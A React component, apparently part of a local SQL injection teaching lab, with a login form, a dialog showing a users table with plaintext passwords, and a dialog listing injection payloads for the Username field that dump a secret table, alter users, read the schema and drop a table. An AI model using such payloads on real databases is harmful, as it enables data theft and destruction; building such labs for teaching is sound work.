
import React, {useState} from 'react';
import "./SqlInjection.css";
import AccordionDetails from '@mui/material/AccordionDetails';
import Typography from '@mui/material/Typography';
import TextField from '@mui/material/TextField';
import Box from '@mui/material/Box';
import Button from '@mui/material/Button';

//hhtp request
import axios from 'axios';

//Dialog material UI
import Dialog from '@mui/material/Dialog';
import DialogActions from '@mui/material/DialogActions';
import DialogContent from '@mui/material/DialogContent';
import DialogContentText from '@mui/material/DialogContentText';
import DialogTitle from '@mui/material/DialogTitle';





export default function SqlInjection({PHPURL, title, maxCaracteres}){
  //PHP URL
  const URL_LOGIN = PHPURL;
  const URL_USERS_Table = "http://localhost/security/showUserTable.php";

  //Mostrar o no texto
  const [mostrarComponente, setMostrarComponente] = useState(true);

  //httpRequest
  const sendData = async (url,data)=>{
    axios.post(url, data)
    .then(res => {
      console.log(res);
      if(res.data['conectado'] === true){
        setMostrarComponente(false);
      }else{
        setMostrarComponente(true);
      }
    })
  } 
  
  //get Users List
  const [data, setData]=useState([]);
      React.useEffect(() => {
      axios.get(URL_USERS_Table)
        .then(response=>{
          setData(response.data);
          
        }).catch(error=>{
          console.log(error);
        });
        console.log(data);

      }, []);
  
  //Obtener inputs
  const handleChange=(event)=>{
    event.preventDefault();
    const data = new FormData(event.currentTarget);
    
      const datos = {
        'username': data.get('username'),
        'password': data.get('password')
      };
      sendData(URL_LOGIN,datos);    
  }
  
  //Dialog States
  const [open, setOpen] = React.useState(false);
  const [open2, setOpen2] = React.useState(false);

  const handleClickOpen = (num) =>{
    if(num === 0){
      setOpen(true);
    }else if(num === 1){
      setOpen2(true);
    }
  }
  const handleClose = (num) =>{
    if(num === 0){
      setOpen(false);
    }else if(num === 1){
      setOpen2(false);
    }
  };
  

  

    return(
        <div>
      
          <AccordionDetails>
            <Typography>
            <Box
                  component="form"
                  sx={{
                    '& > :not(style)': { m: 1, width: '25ch' },
                  }}
                  noValidate
                  autoComplete="off"
                  onSubmit= {handleChange}
                >
                <TextField 
                    id="standard-basic" 
                    label="Username" 
                    variant="standard" 
                    name="username"
                    inputProps={{ maxLength: maxCaracteres }}

                    /> 
                <TextField
                    id="standard-password-input"
                    label="Password"
                    type="password"
                    autoComplete="current-password"
                    variant="standard"
                    name="password"
                    />
                    <p
                    className = {mostrarComponente ? "show-element" : null}
                    >
                      Conected!</p>
                    <Button
                        type="submit"
                        variant="contained"
                        sx={{ mt: 3, mb: 2 }}
                        id="buttonSQL"
                        >
                            Enter
                    </Button>
                    <div>
                      <Button id='buttonSQL' variant="contained" onClick={event => handleClickOpen(0)}>
                        DB
                      </Button>
                      <Dialog
                        open={open}
                        onClose={event => handleClose(0)}
                        aria-labelledby="alert-dialog-title"
                        aria-describedby="alert-dialog-description"
                      >
                        <DialogTitle id="alert-dialog-title">
                          {"DataBase"}
                        </DialogTitle>
                        <DialogContent>
                          <DialogContentText id="alert-dialog-description">
                          <table className="table table-striped">
                            <thead>
                              <tr>
                                <th>User:</th>
                                <th>Pass:</th>
                                <th>Name: </th>
                                <th>Birth: </th>
                              </tr>
                            </thead>
                            <tbody> 
                              {data.map(users=>(
                                <tr key={users.username}>
                                  <td>{users.username}</td>
                                  <td>{users.password}</td>
                                  <td>{users.name}</td>
                                  <td>{users.birth}</td>
                                </tr>
                              ))}
                            </tbody> 
                            </table>   
                          </DialogContentText>
                        </DialogContent>
                        <DialogActions>
                          <Button onClick={event => handleClose(0)} autoFocus>
                            Close
                          </Button>
                        </DialogActions>
                      </Dialog>
                        <Button id='buttonSQL' variant="contained" onClick={event => handleClickOpen(1)}>
                          sql
                        </Button>
                        <Dialog
                          open={open2}
                          onClose={event => handleClose(1)}
                          aria-labelledby="alert-dialog-title"
                          aria-describedby="alert-dialog-description"
                        >
                          <DialogTitle id="alert-dialog-title">
                            {"SQL Injection"}
                          </DialogTitle>
                          <DialogContent>
                            <DialogContentText id="alert-dialog-description">
                              You can inject this code in "Username" input: 
                              <ul>
                                <p>SELECT</p>
                                <li>' OR 1=1; SELECT * FROM supersecret; #</li>
                                <p>INSERT</p>
                                <li>' OR 1=1; INSERT INTO `users`(`username`, `password`, `name`, `birth`) VALUES ('Hacker1','123','SecretName','0000-00-00'); #</li>
                                <p>UPDATE</p>
                                <li>' OR 1=1; UPDATE `users` SET `username`='[value-1]',`password`='[value-2]',`name`='[value-3]',`birth`='[value-4]' WHERE username = "Hacker1"; #</li>
                                <p>DELETE</p>
                                <li>' OR 1=1; DELETE FROM `users` WHERE username = "Hacker1"; #</li>
                                <p>DataBase Version</p>
                                <li>' OR 1=1; SELECT VERSION(); #</li>
                                <p>Drop Table</p>
                                <li>' OR 1=1; DROP TABLE prueba1; #</li>
                                <p>DataBase Schema</p>
                                <li>' OR 1=1;SELECT * FROM information_schema.character_sets; #</li>
                              </ul>
                            </DialogContentText>
                          </DialogContent>
                          <DialogActions>
                            <Button onClick={event => handleClose(1)} autoFocus>
                              Close
                            </Button>
                          </DialogActions>
                        </Dialog>
                    </div>
            </Box>
            </Typography>
          </AccordionDetails>   
        </div>           
    );
}